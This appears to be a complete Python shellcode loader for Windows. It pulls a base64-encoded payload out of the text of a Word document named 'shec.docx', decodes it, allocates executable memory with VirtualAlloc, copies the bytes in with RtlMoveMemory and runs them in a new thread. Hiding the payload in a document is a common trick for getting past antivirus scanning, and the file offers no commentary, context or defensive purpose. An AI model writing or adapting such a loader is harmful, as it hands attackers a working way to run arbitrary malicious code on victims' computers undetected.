from ctypes import cast,windll,create_string_buffer,c_int,c_long,CFUNCTYPE,c_void_p
from threading import Thread
from base64 import b64decode
from docx import Document

def get(filename):
    doc=Document(filename)
    data=doc.paragraphs
    datas=""
    for i in data:
        datas+=i.text
    datas=datas.replace("b'","").replace("'","")

    return b64decode(datas.encode())

shec=get("shec.docx")

VirtualAlloc = windll.kernel32.VirtualAlloc
RtlMove= windll.kernel32.RtlMoveMemory

handle = VirtualAlloc(c_int(0),c_int(len(shec)),c_int(0x3000),c_int(0x40))
old=c_long(1)
run=cast(handle,CFUNCTYPE(c_void_p))

Thread(target=RtlMove,args=(handle,create_string_buffer(shec),c_int(len(shec)))).start()
Thread(target=run,args=(0,)).start()
